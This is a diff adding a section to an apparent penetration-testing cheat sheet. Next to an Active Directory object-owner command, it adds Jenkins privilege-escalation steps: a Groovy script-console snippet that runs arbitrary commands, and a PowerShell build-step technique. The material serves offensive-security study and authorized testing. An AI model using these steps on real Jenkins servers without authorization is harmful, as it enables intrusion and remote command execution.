@@ -200,3 +200,25 @@ The attacker can update the owner of the target object. Once the object owner ha
 **Windows**
 * Set-DomainObjectOwner -Identity 'target_object' -OwnerIdentity 'controlled_principal'
 
+## Privilege Escalation - Feature Abuse - Jenkins
+
+Apart from numerous plugins, there are two ways of executing commands on a Jenkins Master.
+
+* If you have Admin access (default installation before 2.x), go to 
+```
+http://<jenkins_server>/script
+```
+
+* In the script console, Groovy scripts could be executed.
+```
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = '[INSERT COMMAND]'.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println "out> $sout err> $serr"
+```
+
+If you don't have admin access but could add or edit build steps in the build configuration. Add a build step, add "Execute Windows Batch Command" and enter:
+```
+powershell -c <command>
+```
